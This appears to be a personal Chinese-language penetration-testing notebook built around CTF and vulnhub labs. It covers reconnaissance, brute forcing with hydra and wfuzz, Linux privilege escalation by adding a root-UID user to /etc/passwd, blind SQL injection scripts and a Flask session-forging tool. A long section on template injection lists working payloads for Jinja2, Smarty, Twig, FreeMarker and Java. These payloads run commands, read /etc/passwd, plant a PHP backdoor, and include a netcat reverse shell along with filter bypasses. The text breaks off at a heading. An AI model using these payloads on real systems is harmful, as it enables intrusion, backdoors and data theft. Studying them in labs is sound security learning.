# 渗透

## 1.信息收集

### 1）主机发现

使用nmap扫描主机，xx.xx.xx.0/24

arp-scan -l 扫描同一个网段存在的主机，速度非常快

### 2)端口扫描

nmap -p 指定端口号，-p- 扫描0-65535 ； -sS 查看运行的服务， -sv查看运行的软件版本

常见的端口攻击http://www.hackdig.com/01/hack-576819.htm

### 3）目录扫描

dirb dirsearch扫描目录

nikto -host 地址； host 后可跟 ip 地址，也可跟域名 url 的形式，例如：默认扫描会目标80端口，http协议，我们可以控制参数使得nikto对目标https协议，443端口进行扫描，并检查 ssl 一些常见的问题

`nikto -host http://172.168.1.105 -ssl -port 443`

有时候我们只需要扫描网站下的某个子目录，使用-c 参数指定扫描的目录，使用-c all 可进行目录爆破，并扫描

```ABAP
nikto -host http://192.168.1.7 -c /dvwa
```





**文件扫描**



​		参数fuzz

​		

## 2.爆破fuzz

### **1）wfuzz**

[使用超级详细参考](http://t.zoukankan.com/-qing--p-11624494.html)

wfuzz 基本使用

**路径或文件fuzz**

```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ

wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php
```

**url参数中的fuzz**

```
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```

**模糊POST请求**，比如账号密码爆破，

如果您想模糊一些表单编码的数据（例如HTML表单），只需传递-d命令行参数即可：

```
wfuzz -z file,/usr/share/wfuzz/wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp
```

cookie请求 -b参数

要将自己的cookie发送到服务器，例如，将请求与HTTP会话相关联，可以使用-b参数（对各种cookie重复）：

```
$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ
```

在爆文件名的参数的时候，如果是Linux操作系统，可以尝试把值设为**/etc/passwd**   当该值作为参数传递时，可以加../../../，否则打不开。举例：

`wfuzz -b 'SL_G_WPT_TO=eo; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; PHPSESSID=3huujdf706d35tq0i36020kb18' -w /usr/share/wfuzz/wordlist/general/common.txt --hw 100 http://172.16.12.161/manage.php?FUZZ=../../../../../etc/passwd`

### **2）bp抓包爆破**

### 3）九头蛇（hydra）协议账号密码爆破

几乎支持所有协议的在线破解；[使用方法](https://blog.csdn.net/weixin_42350212/article/details/116419960?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166626512816782395382196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166626512816782395382196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116419960-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=hydra&spm=1018.2226.3001.4187)

支持破解ftp http https 路由器 http-proxy  smb   Windows远程桌面 邮箱pop3  telnet破解  语音通讯工具teamspeak  cisco......

```undefined
语法：Hydra 参数 IP 服务
```

举例，破解ssh登录账号密码，其中参数详解见使用方法，-L 指定字典，小写-l 直接指定某个username ；-P同理，-t 线程；

`hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh`

### 4）enum4linux枚举工具

**在smb协议存在时可能可以使用** [参考](https://blog.csdn.net/qq_63844103/article/details/127219997?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166633608316800182710217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166633608316800182710217&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127219997-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=enum4linux&spm=1018.2226.3001.4187)

SMB是一个协议名，全称是**Server Message Block**（服务器消息快协议），用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居由它实现。一般**共享文件夹**和**打印机**使用较多，smb的默认端口可能是**139**或者**445**，其工作的端口与其使用的协议有关。

Enum4linux是用于枚举windows和Linux系统上的SMB服务的工具。可以轻松的从与**SMB服务**有关的目标中快速提取信息。

实战中最常用的其实也就是使用**-a**指令，进行一次大范围信息探测，指令如下

```css
enum4linux -a -o ip
```

举例：EMPIRE: BREAKOUT

通过查看源码得到一个密码；但是不知道用户名，nmap 发现其开放了这几个命令，其中有139,445两个端口，拥有smb，就可以使用

![image-20221021152327586](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021152327586.png)

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021152652134.png" alt="image-20221021152652134" style="zoom:33%;" />

enum4linux -a 172.16.12.162 枚举用户名；

















## 3.漏洞利用

## 4.权限提升

Linux权限提升参考https://zhuanlan.zhihu.com/p/408153639

https://www.sohu.com/a/587131612_121217831 [提权小技巧合集](https://www.sohu.com/a/587131612_121217831)

信息收集：sudo -l 查看普通用户可以执行的root权限有哪些；history 查看普通用户做了些什么命令；ls -a 查看当前普通户下的所有东西；find 查找 、uname -a 查看操作系统的版本

### 1.Linux版本脏牛提权

### 2.sudo提权

### 3.SUID提权

查看SUID程序：

```bash
find / -perm -u=s -type f 2>/dev/null
或者
find / -perm -4000 -type f 2>/dev/null
```

这个命令会在整个文件系统中搜索，找出拥有 SetUID 位设置的所有文件。这些文件在执行时将具有拥有者的权限，而不是执行者的权限。意思说我可以通过执行其中拥有者（root)的文件来获得拥有者的权限（root)











### 3.crontab定时提权

### 4./etc/passwd 中UID GID提权；

需要可以更改/etc/passwd内容的权限

当可以修改/etc/passwd 的内容时，最简单的提权就是这个；root 用户的UID和GID都为0，反过来可以根据这个成为root ，也就是说如果添加一个用户在/etc/passwd 里面的UID & GID都是0的话，那么它的**权限就是root，因此达到权限提升**；

举例：DC9 靶机提权：

通过其中一个普通用户查看到存在一个程序：usage ：python test.py read append 

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220045809.png" alt="image-20221020220045809" style="zoom:33%;" />



usage 注释，read 表示可以读，append表示可以添加，那么就可以联想到添加内容到/etc/passwd

/etc/passwd 内容的格式：

![image-20221020220821445](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220821445.png)

![image-20221020220855884](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220855884.png)

了解规则之后，则在/tmp目录下生成这个用户格式，然后使用test这个程序将它加入到/etc/passwd

`echo 'admin: $1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root: / bin/bash'>>/tmp/passwd`

然后`sudo ./test /tmp/passwd /etc/passwd` 将用户添加到配置文件中，然后使用 `su admin`就切换到admin用户，该用户就是root权限

**其中添加的用户格式中，用户密码是x则代表来自/etc/shadow 文件中，否则需要将密码进行hash加密并格式化：使用kali里面的openssl:**



`openssl passwd -l -salt admin 123456`     -salt加盐处理

### 5.getcap **-r / 2>/dev/null** && find / -perm -4000 2> /dev/null  查找读写权限文件提权

关于getcap  执行拥有capabilities的文件，也就是赋予普通用户一些权限的文件，参考capabilities

find / -perm -4000 2>/dev/null  详见[提权小技巧合集](https://www.sohu.com/a/587131612_121217831)；

![image-20221021200755325](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021200755325.png)

使用

`find / -perm -4000 -type f 2>/dev/null` 检查弱二进制文件,使用[举例见提权小技巧合集](https://www.sohu.com/a/587131612_121217831)

`getcap -r / 2>/dev/null`查找对被设置了Capability的文件进行搜寻。

举例：

![](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021201244377.png)

tar这个程序——绿色高亮区域显示 cap_dac_read_search 允许读取任何文件，[ep](https://blog.csdn.net/alex_yangchuansheng/article/details/102830246?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-102830246-blog-123296652.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-102830246-blog-123296652.pc_relevant_aa&utm_relevant_index=4)代表可以，这意味着我们可以使用此实用程序读取任何文件；也就是将我们想查看的文件但是没有权限的，就可以使用tar先压缩再解压就可以读取了，[详细见](https://resources.infosecinstitute.com/topic/empire-breakout-vulnhub-ctf-walkthrough/)

还有一个举例见[提权小技巧合集](https://www.sohu.com/a/587131612_121217831)

# 漏洞利用

## 1.sql注入

### 1）工具使用之sqlmap

使用sqlmap 探索是否存在注入:

最基本格式

get方式：

`sqlmap -u "url/?id=1"` 

post方式

`sqlmap -u "url" --data="xx"`或者`sqlmap -r post.txt`文件中为抓包的数据，可以自动检测参数

cookie 方式

`sqlmap -u “url“ --cookie=["xxx"] --level=2`

具体参考 [链接—超详细（包含sql注入靶场测试例子](https://blog.csdn.net/songbai220/article/details/109303110?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-109303110-blog-113835025.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-109303110-blog-113835025.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=3)

### [2）时间盲注](https://blog.csdn.net/weixin_45488495/article/details/115558422?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167532589916800188563766%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167532589916800188563766&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-115558422-null-null.142^v72^insert_down4,201^v4^add_ask&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1018.2226.3001.4187)

联合查询，报错注入，以及布尔盲注，都是基于攻击网站会回显消息，或者将错误信息返回在前端，或者会返回web页面的正确或错误

但是有时候网站关闭了错误回显或过滤了某些关键字，网页会返回一种状态([status](https://so.csdn.net/so/search?q=status&spm=1001.2101.3001.7020)，只要进行了http传输，那么就会有一个状态值)，这时候就要用到时间盲注

时间盲注的基本函数

if(1,2,3)：如果1为True，则执行2，否则执行3

sleep(x)：延迟x秒之后执行

ascii(char)：将字符转换为对应的ascii码

substr(str,pos,len)：将字符串从pos位开始截取len长度

Benchmark(x,1)： 执行表达式1，x次(消耗CPU)

基于时间盲注的思路

if() 函数，如果参数1为真，那么执行参数2(sleep函数)，否则执行参数3(一般为1)

SELECT * FROM users WHERE id = 1 and if(1=1,sleep(6),1)

此时可以在navicat上看到查询时间，当1=1恒为真，那么执行sleep()函数；

and后要紧跟 true or false ，所以第一个参数为false之后，就立即执行参数3，所以一般参数3为1，这样就可以正确查询and前的语句

为什么返回页面没有差异

第一种情况：无论输入什么都只显示无信息页面，如登录页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况也不知道。在这种情况下有可能基于时间的SQL注入会有效

第二种情况：无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面，采集用户的IP，浏览器类型，refer字段，session字段，无论用户输入什么，都显示正常页面

第三种情况：差异页面不是由URL中的SQL语句来决定的。这种情况下，也只能使用基于时间盲注

判断注入

payload

if(now() = sysdate(),sleep(6),0)

1.通过使用几次这个语句改变sleep的时间，来说明存在注入

2.有的页面显示的有非法请求，但是这种很可能已经将SQL语句带入数据库执行了

3）布尔盲注

脚本：

```python
 	flag=''
 	url=''
 	payl = "' and if (ascii(substr(database(),{},1))>{},sleep(5),1) #"
    for i in range(1,length+1):
        low=32
        high=128
        mid=(low+high)//2
        while low<high:
            payload = paload_str.format(i,mid)
            print(payload)
            start_time=time.time()
            res=requests.get(url=url+payl)
            use_time=time.time()-start_time
            if use_time>5:
                low=mid+1
            else:
                high=mid
            mid=(low+high)//2
        print(chr(mid))
        flag+=chr(mid)
        print(flag)
```

### 3）布尔盲注

> ## ***\*1.1、原理：\****
>
> Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如为真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等。不需要返回结果，仅判断语句是否正常执行



> ## 1.2、判断：
>
> Bool盲注中通常会配套使用一些判断真假的语句来进行判定。常用的发现Bool盲注的方法是在输入点后面添加and 1=1和and 1=2（该Payload应在怀疑是整型注入的情况下使用）。
>
> ------
>
> 如果题目后端拼接了SQL语句，and 1=1为真时不会影响执行结果，但是and 1=2为假，页面则可能会没有正常的回显。

> ## 1.3、绕过：
>
> 有时候我们可能会遇到将1=1过滤掉的SQL注入点，这时候我们可以通过修改关键字来绕过过滤，比如将关键字修改为不常见的数值（如1352=1352等）。
>
> ------
>
> 在字符串型注入的时候我们还需要绕过单引号，将Payload修改为如下格式'and'1'='1和'or'1'='2来闭合单引号（第一个引号闭合原句中引号，原句中后面的引号拼接到语句中了）

脚本：

```python
import requests
import time

url = "http://e7ddd70b-0bce-40fb-b172-42bb976aeb7a.node4.buuoj.cn:81"
temp = {"stunum": ""}
column = ""
for i in range(1, 1000):
    time.sleep(0.6)
    low = 32
    high = 128
    mid = (low + high) // 2
    while (low < high):
        # 库名
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" %(i,mid)
        # 表名
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        # 字段名
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),%d,1))>%d)^1" %(i,mid)
        # 内容
        temp["stunum"] = "1^(ascii(substr((select(group_concat(flag,value))from(flag)),%d,1))>%d)^1" % (i, mid)
        r = requests.get(url, params=temp)
        time.sleep(0.4)
        print(low, high, mid, ":")
        if "Hi" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    column += chr(mid)
    print(column)

print("All:", column)
```



## 2.session伪造

session伪造的必要条件是获取Secret_KEY

在kali里面：

```
解码：
python3  flask_session_cookie_manager3.py decode -s "密钥" -c "session"

改你要改的内容。

加密：python3  flask_session_cookie_manager3.py encode -s "密钥" -t "上面解密出的一串字符串（一般伪造更改后）"
```

或者脚本：

```
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))



```





## [3.SSTI模板注入](https://www.cnblogs.com/tr1ple/p/9415641.html)

__class__ ： 返回对象所属的类
__mro__ ： 返回一个类所继承的基类元组，方法在解析时按照元组的
顺序解析。
__base__ ： 返回该类所继承的基类
// __base__和__mro__都是用来寻找基类的
__subclasses__ ： 每个新类都保留了子类的引用，这个方法返回一个
类中仍然可用的的引用的列表
__init__ ： 类的初始化方法
__globals__ ： 对包含函数全局变量的字典的引用

相关pyload：

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
```



```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['
os'].system('ls')}}
```



```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```



关于jinja2 的[payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)：

```handlebars
#命令执行：



{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}



#文件操作



{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

其中第一条payload中的[id]可以替换成命令,如ls,cat等,第二条payload的[filename]也可替换成文件名称.

关于绕过，如果禁用了_globlas_

可以采用拼接绕过或者切片绕过：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__['__glo'+'bals__']['__builtins__']['__imp'+'ort__']('o'+'s').popen('ls').read() }}{% endif %}{% endfor %}
```



### **最全总结：**

找到模板注入主要从三个方向进行攻击

(1)模板本身
(2)框架本身
(3)语言本身

**1.模板本身；**

**（1）Smarty**

[payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)

打开文件**：**

```css
{self::getStreamVariable("file:///proc/self/loginuid")}
```

 写后门：

```cobol
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**（2）Twig**

payload：其中id是命令；

```handlebars
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

 **（3）freeMarker**

```cobol
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

**2.利用框架本身的特性进行攻击**

 **1）.Django**

```cobol
http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```



**2）.Flask/Jinja2**

config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。

```handlebars
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}
//写文件
{{ config.from_pyfile('/tmp/evil') }}
//加载system

{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
//执行命令反弹SHELL
```

**3）.Tornado**

```cobol
http://117.78.26.79:31093/error?msg={{handler.settings}}
```

 3**.利用模语言本身的特性进行攻击**

 1）python

[Python 沙盒逃逸备忘 | K0rz3n's Blog](https://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/#题目一、)

**2）.JAVA**

**payload：**

```scss
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

当然要是文件操作就要用另外的类了,思路是不变的

```scss
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```





### 读写文件

#### 方法一

##### **常用函数：**

复制

```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的模块、方法以及所有变量。查看所有键名：__globals__.keys()。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

cycler               {{cycler.__init__.__globals__.os.popen('id').read()}}
joiner               {{joiner.__init__.__globals__.os.popen('id').read()}}
namespace            {{namespace.__init__.__globals__.os.popen('id').read()}}
```

##### 常用过滤器：

```
int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
length()：返回字符串的长度，别名是count。
```

##### 获取基本类：

```
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用
```

##### 获取基本类后，继续向下获取基本类(object)的子类：

```
object.__subclasses__()
```

找到重载过的`__init__`类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带wrapper的）：

```
>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>

>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

##### 查看其引用`__builtins__`：

> **builtins**即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于**builtins**却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

#### 方法二

存在的子模块可以通过`.index()`来进行查询，如果存在的话返回索引，直接调用即可：

```
>>> ''.__class__.__mro__[2].__subclasses__().index(file)
40

[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() 
#将read() 修改为 write() 即为写文件
```

### 命令执行

#### 利用eval 进行命令执行

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

#### 利用warnings.catch_warnings 进行命令执行

查看`warnings.catch_warnings`方法的位置：

```
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
  59
```

查看`linecatch`的位置：

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
  25
```

查找`os`模块的位置：

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
  12
```

查找`system`方法的位置（在这里使用`os.open().read()`可以实现一样的效果,步骤一样,不再复述）：

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
  144
```

调用`system`方法：

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
  root
```

直接搜索：

```
>>> [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('whoami').read()
```

#### 利用commands 进行命令执行

```
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

#### 利用任意字符串或特殊变量

```
sss.__init__.__globals__.__builtins__.open("/flag").read()
config.__class__.__init__.__globals__['os'].popen('ls').read()
request.application.__globals__['__builtins__']['__import__']('os').popen('ls').read()
```

### 绕过

#### **中括号 []**

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

在这里使用pop并不会真的移除，但却能返回其值，取代中括号，来实现绕过。

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)("cat /flag",shell=True,stdout=-1).communicate().__getitem__(0)
```

unicode字符：`［］`，`﹇﹈`

#### 引号 ‘’**

